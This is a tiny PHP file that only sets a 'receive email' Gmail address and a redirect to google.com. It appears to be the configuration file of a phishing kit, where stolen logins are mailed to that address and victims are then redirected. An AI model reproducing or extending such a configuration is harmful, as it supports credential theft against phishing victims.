<?php 
$Receive_email="lanrebayo234@gmail.com";
$redirect="https://www.google.com/";
?>